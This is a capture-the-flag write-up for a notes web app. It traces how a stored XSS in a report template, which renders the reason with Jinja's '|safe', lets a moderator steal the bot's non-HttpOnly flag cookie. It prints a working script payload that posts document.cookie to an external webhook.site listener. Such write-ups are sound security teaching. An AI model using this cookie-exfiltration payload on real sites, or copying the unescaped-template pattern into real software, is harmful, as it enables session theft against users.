## Initial Reconnaissance: Finding the Flag's Location
`FLAG_STAGE_3` can be found in bot's cookies when it is initialized, `httpOnly: false`, means that we can have access to this cookie from frontend.
```js
await browser.setCookie({
            domain: baseUrl.replace('http://', '').replace('https://', ''),
            name: 'FLAG',
            value: FLAG_STAGE_3,
            httpOnly: false,
        })
```


Bot service is called when moderator reports a note (`server/main.py`):
```python
@app.route('/report/<note_id>', methods=['GET', 'POST'])
@login_required
@moderator_required
def report_note(note_id):
    if note_id not in notes:
        abort(404)
    if request.method == 'POST':
        reason = request.form['reason']
        reported_notes[note_id] = {'reason': reason, 'reported_by': g.user.get('username'), **notes.get(note_id, {})}
        try:
            response = requests.post(f'{BOT_SERVICE_URL}/bot',
                                     json={'url': CHALLENGE_SERVICE_URL + url_for('report_note', note_id=note_id)})
            return response.text, response.status_code
        except requests.exceptions.RequestException as e:
            return f'Error contacting admin: {e}', 500
    if note_id not in reported_notes:
        redirect(url_for('view_note', note_id=note_id))
    return render_template('report_note.html', note=reported_notes[note_id])
```

## XSS
In report note html template we see the possibility for XSS injection:
```html
{# The reason is safe, why else would we allow it to be reported? #}
        <p>Report reason: {{ note.reason|safe }}</p>
        <p>Reported by: {{ note.reported_by }}</p>
```
The use of `|safe` explicitly disables Jinja2's default output encoding, creating a Stored XSS vulnerability. An attacker with moderator privileges can submit a report containing a JavaScript payload.

## Exploitation
From previous step we have moderator role, so we can report note and past into `note.reason` malicious code that will be executed when bot will access reported note.
Our script will extract cookies and send them to our http listener. (We used webhook for this purpose)

```html
<script>
    fetch('https://webhook.site/ae28ff10-cd3d-4879-a457-48b0362', {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
    });
</script>
```

Upon submission of the report, the bot triggers the payload. The external listener receives the bot's non-`HttpOnly` cookies, which includes `FLAG_STAGE_3`.
**Received Data:** `FLAG=GPNCTF{...flag_stage_3...}`

